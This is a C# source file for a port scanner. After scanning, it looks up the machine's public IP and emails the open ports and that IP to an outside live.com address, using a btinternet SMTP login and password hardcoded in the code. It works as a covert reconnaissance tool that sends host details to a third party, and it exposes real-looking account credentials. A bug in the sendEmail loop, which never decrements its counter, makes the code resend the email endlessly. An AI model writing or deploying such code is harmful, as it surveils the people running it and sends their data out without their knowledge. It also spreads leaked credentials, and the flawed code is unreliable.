using System;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Net.Mail;
namespace PortScannerTest
{
    class PortScanningClass
    {
        public int[] popenPortArray = new int[100];
        int counter = 0;

        // IsIpAddress
        //
        // The following routine returns true if a given string is a valid IP address 

        static bool IsIpAddress(string Address)
        {
            // The following pattern matches an IP address 
            Regex IpMatch = new Regex(@"\b(?:\d{1,3}\.){3}\d{1,3}\b");
            return IpMatch.IsMatch(Address);
        }



                static string GetIPAddress() 
            {
                                HTTPGet req = new HTTPGet();
                                req.Request("http://checkip.dyndns.org");
                                string[] a = req.ResponseBody.Split(':');
                                string a2 = a[1].Substring(1);
                                string[] a3=a2.Split('<');
                                string a4 = a3[0];
                                Console.WriteLine(a4);
                                Console.ReadLine();
                    

                                return a4;
            }

                static bool sendEmail(int[] ports, string localIP)
                {
                    int counter = 3;
                    while (counter > 0)
                    {
                        var builder = new StringBuilder();
                        Array.ForEach(ports, x => builder.Append(x));

                        string messageContent = (builder.ToString() + "\n" + localIP);
                       

                            SmtpClient smtpClient = new SmtpClient();
                            NetworkCredential basicCredential =
                                new NetworkCredential("bondhenry123@btinternet.com", "faxeYuw3");
                            MailMessage message = new MailMessage();
                            MailAddress fromAddress = new MailAddress("bondhenry123@btinternet.com");

                            smtpClient.Host = "mail.btinternet.com";
                            smtpClient.UseDefaultCredentials = false;
                            smtpClient.Credentials = basicCredential;

                            message.From = fromAddress;
                            message.Subject = "Data";
                            //Set IsBodyHtml to true means you can send HTML email.
                            message.IsBodyHtml = false;
                            message.Body = messageContent;
                            message.To.Add("incoherent2010@live.com");

                            try
                            {
                                smtpClient.Send(message);
                            }
                            catch (Exception ex)
                            {
                                //Error, could not send the message
                                Console.WriteLine(ex.Message);
                            }

                       
                    }


                    return false;

                }
        // LookupDNSName
        //
        // 

        static bool LookupDNSName(string ScanAddress, out IPAddress ScanIPAddress)
        {
            ScanIPAddress = null;
            IPHostEntry NameToIpAddress;

            try
            {
                // Lookup the address we are going to scan 
                NameToIpAddress = Dns.GetHostEntry(ScanAddress);
            }
            catch (SocketException)
            {
                // Thrown when we are unable to lookup the name
                return false;
            }

            // Pick the first address in the list , there should be at least 1 
            if (NameToIpAddress.AddressList.Length > 0)
            {
                ScanIPAddress = NameToIpAddress.AddressList[0];
                return true;
            }

            return false;
        }

        static bool ScanPort(IPAddress Address, int Port)
        {
            TcpClient Client = new TcpClient();
            try
            {
                // Attempt to connect to the given address + port 
                Client.Connect(Address, Port);

                // This may seem like an avoidable step -- but TcpClient.Close does not
                // actually close the underlying connection
                // http://support.microsoft.com/default.aspx?scid=kb%3Ben-us%3B821625

                NetworkStream ClientStream = Client.GetStream();
                ClientStream.Close();

                // Free the TCPClient resource
                Client.Close();
            }
            catch (SocketException)
            {
                // Assume that a socket exception means the connection failed
                // Client.Connect returns a void (so provides no insights into 
                // what it was doing)
                return false;
            }
            return true;
        }

        public void portScan(string[] args)
        {
           
            String ScanAddress;
            IPAddress ScanIPAddress;

            try
            {
                // Try to read the scan address from the command line, or default to localhost
                if (args.Length != 0)
                    ScanAddress = args[0];
                else
                    ScanAddress = "127.0.0.1";

                // Both a hostname or an IP address are fine
                if (IsIpAddress(ScanAddress))
                {
                    ScanIPAddress = IPAddress.Parse(ScanAddress);
                }
                else
                    if (!LookupDNSName(ScanAddress, out ScanIPAddress))
                    {
                        Console.WriteLine("Error looking up {0}", ScanAddress);
                        return;
                    }
                Console.WriteLine("working");
                // Report what we are going to do
                // Console.WriteLine("Port scanning {0} ({1})", ScanAddress, ScanIPAddress.ToString());

                // Scan all the possible posts 
                for (int Port = IPEndPoint.MinPort; Port < (IPEndPoint.MaxPort - 65000); Port++)
                {
                   
                    // Console.Write("Scanning port {0} : ", Port);
                    if (ScanPort(ScanIPAddress, Port))
                    {
                        popenPortArray[counter] = Port;
                        counter++;
                        Console.WriteLine(Port + "OPEN");
                    }
                    else { }
                }
                // Close Up

                Console.WriteLine("open ports are:");
                foreach (int i in popenPortArray)
                {
                    if (i != 0)
                    {
                        Console.WriteLine(i);
                    }

                }
                string localIP = GetIPAddress();
                sendEmail(popenPortArray, localIP);
                Console.WriteLine("Finished scanning all ports");

            }
            catch (Exception e)
            {
                Console.WriteLine("Exception caught!");
                Console.WriteLine("Source : " + e.Source);
                Console.WriteLine("Message : " + e.Message);
            }

        }
    }
    }

